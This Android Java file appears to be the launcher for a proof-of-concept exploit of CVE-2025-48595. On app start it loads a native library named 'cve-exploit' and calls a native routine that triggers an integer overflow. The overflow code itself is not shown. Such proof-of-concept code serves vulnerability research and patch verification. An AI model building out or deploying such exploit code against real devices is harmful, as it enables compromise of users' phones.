package com.example.android_poc;

import android.app.Activity;
import android.os.Bundle;
import android.util.Log;
import android.widget.Toast;

public class MainActivity extends Activity {
    private static final String TAG = "CVE-2025-48595";

    static {
        System.loadLibrary("cve-exploit");
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        Log.i(TAG, "App started. Initializing POC...");
        triggerIntegerOverflowNative();

        Toast.makeText(this, "CVE-2025-48595 Overflow Triggered", Toast.LENGTH_LONG).show();
    }

    private native void triggerIntegerOverflowNative();
}